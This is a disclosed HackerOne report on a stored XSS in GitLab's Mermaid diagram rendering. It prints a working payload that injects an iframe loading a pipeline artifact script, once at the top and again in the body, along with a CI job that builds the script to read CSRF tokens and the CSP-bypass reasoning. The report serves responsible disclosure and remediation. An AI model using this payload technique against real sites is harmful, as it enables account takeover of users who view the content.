```mermaid
%%{init: {"flowchart": {"htmlLabels": "false"}} }%%
flowchart
  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
```

---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-dom
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - DOM"
enriched: true
body: true
date: 2021-10-18
submitted: 2021-05-30T01:49:50.159Z
bounty_usd: null
votes: 42
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "saleemrashid"
source: "https://hackerone.com/reports/1212822"
title: "Stored XSS in Mermaid when viewing Markdown files"
---
# Stored XSS in Mermaid when viewing Markdown files

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 42 | **Program:** GitLab | **Disclosed:** 2021-10-18

- Report: [https://hackerone.com/reports/1212822](https://hackerone.com/reports/1212822)
- CWE: Cross-site Scripting (XSS) - DOM
- Submitted: 2021-05-30T01:49:50.159Z

## Report summary

#

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

GitLab's Mermaid configuration allows an attacker to inject HTML in the rendered Markdown. This can be combined with a CSP bypass using pipeline artifacts to achieve RCE.

### Steps to reproduce

1. Create a repository on GitLab.com

2. Add the following to `.gitlab-ci.yml`

```yaml
---
job:
  script:
  - "echo 'alert(parent.document.querySelector(\"meta[name=csrf-token]\").outerHTML)' > exploit.js"
  artifacts:
    paths:
    - exploit.js
```

3. Wait for the pipeline to finish and record the job ID

4. Add the following to `README.md`, changing the project name (`saleemrashid/mermaid-exploit-7032e404`) and job ID (`1303935016`) accordingly

~~~

~~~

5. Open `README.md` (or any page that renders it, including the project overview page), and observe the alert containing the CSRF token (e.g. `<meta name="csrf-token" content="XXXXXX">`) caused by executing `exploit.js`

### Impact

Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.

### Examples

Private project on GitLab.com https://gitlab.com/saleemrashid/mermaid-exploit-7032e404

### What is the current *bug* behavior?

Mermaid supports HTML labels when `flowchart.htmlLabels` is enabled and `securityLevel` is not `strict`. GitLab's configuration disables this functionality https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/assets/javascripts/behaviors/markdown/render_mermaid.js#L40-52

```javascript
  mermaid.initialize({
    // mermaid core options
    mermaid: {
      startOnLoad: false,
    },
    // mermaidAPI options
    theme,
    flowchart: {
      useMaxWidth: true,
      htmlLabels: false,
    },
    securityLevel: 'strict',
  });
```

However, Mermaid also supports directives (https://mermaid-js.github.io/mermaid/#/directives) to alter the configuration. For security reasons, these directives aren't able to override certain configuration options https://github.com/mermaid-js/mermaid/blob/8.9.2/src/defaultConfig.js#L114-L120

```javascript
  /**
   * This option controls which currentConfig keys are considered _secure_ and can only be changed via
   * call to mermaidAPI.initialize. Calls to mermaidAPI.reinitialize cannot make changes to
   * the `secure` keys in the current currentConfig. This prevents malicious graph directives from
   * overriding a site's default security.
   */
  secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize'],
```

While you can't override `securityLevel`, it turns out that overriding `flowchart.htmlLabels` to `"false"` (specifically the string, not the boolean) is sufficient to bypass the sanitization https://github.com/mermaid-js/mermaid/blob/8.9.2/src/diagrams/common/common.js#L34-L54

```javascript
  let htmlLabels = true;
  if (
    config.flowchart &&
    (config.flowchart.htmlLabels === false || config.flowchart.htmlLabels === 'false')
  ) {
    htmlLabels = false;
  }

  if (htmlLabels) {
    const level = config.securityLevel;

    if (level === 'antiscript') {
      txt = removeScript(txt);
    } else if (level !== 'loose') {
      // eslint-disable-line
      txt = breakToPlaceholder(txt);
      txt = txt.replace(/</g, '&lt;').replace(/>/g, '&gt;');
      txt = txt.replace(/=/g, '&equals;');
      txt = placeholderToBreak(txt);
    }
  }
```

The above code will not sanitize the label if `flowchart.htmlLabels` is set to `false` or `"false"`. It seems like the intention is to not sanitize the label if it's going to be rendered as text, which makes sense. However, the code that actually decides whether to render it as HTML or text always uses `if (config.flowchart.htmlLabels)`, which would succeed for the string `"false"` (because it's truthy). This means the sanitization is bypassed, but the string is still rendered as HTML, resulting in XSS.

To make use of the XSS, we need to bypass the CSP:

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.recaptcha.net/ https://apis.google.com 'nonce-<nonce>'
```

Using nonces causes the browser to ignore `'unsafe-inline'`, so we can't use inline scripts. However, we can take advantage of the fact that Workhorse will serve pipeline artifacts with an auto-detected `Content-Type` based on the file extension https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/workhorse/internal/artifacts/entry.go#L98-101

```go
	// Write http headers about the file
	headers.Set("Content-Length", contentLength)
	headers.Set("Content-Type", detectFileContentType(fileName))
	headers.Set("Content-Disposition", "attachment; filename=\""+escapeQuotes(basename)+"\"")
```

The `Content-Disposition` header prevents this from being used for HTML/SVG-based XSS, but it still allows pipeline artifacts to be used as scripts or stylesheets. Because they are on the same domain, they satisfy `'self'` in the CSP policy.

Finally, RCE can be achieved by using the XSS to inject the following HTML, executing a pipeline artifact as JavaScript (`<iframe srcdoc>` is used because you can't directly inject a `<script>` tag with `innerHTML`). This example refers to an artifact on a private repository to maintain responsible disclosure, but you would enable public pipelines for an actual exploit (or add an access token to the URL) so the artifact is accessible by any user.

```html
<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>
```

### What is the expected *correct* behavior?

Mermaid should not allow HTML injection. While configuration changes and upstream bugfixes could improve the situation, it might be prudent to move Mermaid into a sandboxed `iframe` to avoid future vulnerabilities. For example, it also supports specifying `themeCSS` (which I attempted to use for a CSS exfiltration attack, but it wasn't practical to exfiltrate more than a few characters because the CSP didn't allow to `@import` files from an external server).

Additionally, Workhorse serving artifacts with dangerous `Content-Type` headers might not be secure behavior because it allows to bypass the CSP.

### Output of checks

This bug happens on GitLab.com

## Impact

Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.

## Timeline

- **Report Filed**
- **2021-05-30** @saleemrashid: On re-reading this, I realize that "RCE" implies that there's server-side code execution which this isn't. This is just XSS and a CSP bypass, but I wrote "RCE" in an attempt to make it clear the XSS is useful and can execute JS and steal CSRF tokens, etc. Sorry if that causes any confusion :)
- **2021-05-31** @h1_analyst_everton: Hi @saleemrashid,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@glassofbeer
- **Report Title Updated**
- **Report Severity Updated**
- **Report Pending Program Review**
- **2021-06-03** @rchan: Hey @saleemrashid,

This is a great find, thank you for taking the time to submit this vulnerability.

Do you have any suggestions how we should fix this vulnerability?

Thanks,
Ron
GitLab Security Team
- **Report Triaged**
- **Bounty Awarded**
- **2021-06-04** @gitlab-securitybot: ETA for fix:

Hi @saleemrashid,

The issue you reported is currently scheduled to be fixed by 2021-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2021-06-04** @saleemrashid: Hi @rchan,

Thank you for the initial bounty!

As a stop-gap measure, you could probably add some more fields to `secure` in the `mermaid.initialize` invocation, which would prevent directives from overriding them. An improved short-term fix for this issue would be to remove the directive-handling code entirely from GitLab's version of Mermaid.

It would probably be worth notifying upstream about the `htmlLabels` bug (where the string `"false"` is handled differently), because I don't think that's intended behaviour -- though a lot of the Mermaid security features seem to also be broken (e.g. `securityLevel: "antiscript"` has plenty of trivial bypasses).

I think the long-term solution for GitLab should be to sandbox Mermaid (e.g. in an `iframe`) because the way it's written isn't very conducive to ensuring there's no XSS.

Also, I noticed this was triaged as "User interaction: Required". I'm curious what kind of XSS you would consider no interaction required -- I assumed this one would be because it is triggered without the user interacting with anything on the page and the page could be opened by another webpage.
- **2021-06-07** @saleemrashid: I also tested that this is possible anywhere that GFM is used, e.g. issue comments. For example, the following works (using `"themeCSS"` to hide the Mermaid diagram)

~~~

~~~

This is probably more impactful than Markdown files because an attacker could use this in issue comments on popular repositories to target more users.
- **2021-06-08** @rchan: Hey @saleemrashid,

Thank you very much for the feedback, this is very helpful.

About the `User interaction: Required`, we usually consider any type of XSS to be in this category in normal circumstances, because of the nature of XSS. Unless there's a stored XSS found in, say, our home page, then we might review this CVSS setting.

Thank you for this great bug, I wish you the best of luck for the next one.

Thanks,
Ron
GitLab Security Team
- **2021-06-08** @saleemrashid: That makes sense! Thanks for the clarification.
- **Bounty Awarded**
- **2021-07-01** @gitlab-securitybot: ETA for fix:

Hi @saleemrashid,

The issue you reported is currently scheduled to be fixed by 2021-08-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **External User Joined**
- **External User Joined**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
